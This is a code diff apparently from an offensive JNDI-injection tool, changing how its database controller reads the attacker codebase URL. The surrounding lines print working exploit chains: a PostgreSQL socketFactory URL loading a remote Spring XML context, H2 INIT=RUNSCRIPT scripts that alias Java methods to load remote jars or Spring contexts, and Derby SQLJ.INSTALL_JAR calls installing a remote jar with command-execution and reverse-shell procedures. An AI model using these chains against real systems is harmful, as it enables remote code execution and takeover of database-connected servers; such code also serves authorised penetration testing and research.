@@ -3,7 +3,7 @@ package map.jndi.controller;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtField;
-import map.jndi.Config;
+import map.jndi.Main;
 import map.jndi.annotation.JNDIMapping;
 import map.jndi.payload.GroovyPayload;
 import map.jndi.payload.SpringXmlPayload;
@@ -82,7 +82,7 @@ public abstract class DatabaseController implements Controller {
         WebServer.getInstance().serveFile("/" + fileName, fileContent.getBytes());
 
         String socketFactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
-        String socketFactoryArg = Config.codebase + fileName;
+        String socketFactoryArg = Main.config.codebase + fileName;
         String url = "jdbc:postgresql://127.0.0.1:5432/test?socketFactory=" + socketFactory + "&socketFactoryArg=" + socketFactoryArg;
 
         Properties props = new Properties();
@@ -110,7 +110,7 @@ public abstract class DatabaseController implements Controller {
         WebServer.getInstance().serveFile("/" + fileName, fileContent.getBytes());
 
         String socketFactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
-        String socketFactoryArg = Config.codebase + fileName;
+        String socketFactoryArg = Main.config.codebase + fileName;
         String url = "jdbc:postgresql://127.0.0.1:5432/test?socketFactory=" + socketFactory + "&socketFactoryArg=" + socketFactoryArg;
 
         Properties props = new Properties();
@@ -230,7 +230,7 @@ public abstract class DatabaseController implements Controller {
                 "CREATE ALIAS SET_PROPERTY FOR 'java.lang.System.setProperty(java.lang.String, java.lang.String)';\n" +
                 "CREATE ALIAS GET_SOUNDBANK FOR 'javax.sound.midi.MidiSystem.getSoundbank(java.net.URL)';\n" +
                 "SET @clazz = 'java.net.URL';\n" +
-                "SET @url_str = '" + Config.codebase + jarName + "';\n" +
+                "SET @url_str = '" + Main.config.codebase + jarName + "';\n" +
                 "SET @url_obj = UNESCAPE_VALUE(@url_str);\n" +
                 "SET @obj = NEW_INSTANCE(@clazz, @url_obj);\n" +
                 "CALL SET_PROPERTY('jdk.sound.jarsoundbank', 'true');\n" +
@@ -238,7 +238,7 @@ public abstract class DatabaseController implements Controller {
         WebServer.getInstance().serveFile("/" + sqlFileName, sqlContent.getBytes());
 
         String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
-                "INIT=RUNSCRIPT FROM '" + Config.codebase + sqlFileName + "'";
+                "INIT=RUNSCRIPT FROM '" + Main.config.codebase + sqlFileName + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -271,7 +271,7 @@ public abstract class DatabaseController implements Controller {
                 "CREATE ALIAS SET_PROPERTY FOR 'java.lang.System.setProperty(java.lang.String, java.lang.String)';\n" +
                 "CREATE ALIAS GET_SOUNDBANK FOR 'javax.sound.midi.MidiSystem.getSoundbank(java.net.URL)';\n" +
                 "SET @clazz = 'java.net.URL';\n" +
-                "SET @url_str = '" + Config.codebase + jarName + "';\n" +
+                "SET @url_str = '" + Main.config.codebase + jarName + "';\n" +
                 "SET @url_obj = UNESCAPE_VALUE(@url_str);\n" +
                 "SET @obj = NEW_INSTANCE(@clazz, @url_obj);\n" +
                 "CALL SET_PROPERTY('jdk.sound.jarsoundbank', 'true');\n" +
@@ -279,7 +279,7 @@ public abstract class DatabaseController implements Controller {
         WebServer.getInstance().serveFile("/" + sqlFileName, sqlContent.getBytes());
 
         String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
-                "INIT=RUNSCRIPT FROM '" + Config.codebase + sqlFileName + "'";
+                "INIT=RUNSCRIPT FROM '" + Main.config.codebase + sqlFileName + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -301,7 +301,7 @@ public abstract class DatabaseController implements Controller {
                 "CREATE ALIAS NEW_INSTANCE FOR 'org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])';\n" +
                 "CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';\n" +
                 "\n" +
-                "SET @url_str='" + Config.codebase + xmlFileName + "';\n" +
+                "SET @url_str='" + Main.config.codebase + xmlFileName + "';\n" +
                 "SET @url_obj=UNESCAPE_VALUE(@url_str);\n" +
                 "SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext');\n" +
                 "SET @string_clazz=CLASS_FOR_NAME('java.lang.String');\n" +
@@ -310,7 +310,7 @@ public abstract class DatabaseController implements Controller {
         WebServer.getInstance().serveFile("/" + sqlFileName, sqlContent.getBytes());
 
         String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
-                "INIT=RUNSCRIPT FROM '" + Config.codebase + sqlFileName + "'";
+                "INIT=RUNSCRIPT FROM '" + Main.config.codebase + sqlFileName + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -341,7 +341,7 @@ public abstract class DatabaseController implements Controller {
                 "CREATE ALIAS NEW_INSTANCE FOR 'org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])';\n" +
                 "CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';\n" +
                 "\n" +
-                "SET @url_str='" + Config.codebase + xmlFileName + "';\n" +
+                "SET @url_str='" + Main.config.codebase + xmlFileName + "';\n" +
                 "SET @url_obj=UNESCAPE_VALUE(@url_str);\n" +
                 "SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext');\n" +
                 "SET @string_clazz=CLASS_FOR_NAME('java.lang.String');\n" +
@@ -350,7 +350,7 @@ public abstract class DatabaseController implements Controller {
         WebServer.getInstance().serveFile("/" + sqlFileName, sqlContent.getBytes());
 
         String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
-                "INIT=RUNSCRIPT FROM '" + Config.codebase + sqlFileName + "'";
+                "INIT=RUNSCRIPT FROM '" + Main.config.codebase + sqlFileName + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -413,7 +413,7 @@ public abstract class DatabaseController implements Controller {
         WebServer.getInstance().serveFile("/" + className + ".jar", jarBytes);
 
         List<String> list = new ArrayList<>();
-        list.add("CALL SQLJ.INSTALL_JAR('" + Config.codebase + className + ".jar', 'APP." + className + "', 0)");
+        list.add("CALL SQLJ.INSTALL_JAR('" + Main.config.codebase + className + ".jar', 'APP." + className + "', 0)");
         list.add("CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'APP." + className + "')");
         list.add("CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".exec'");
         list.add("CREATE PROCEDURE rev(IN host VARCHAR(255), IN port VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".rev'");
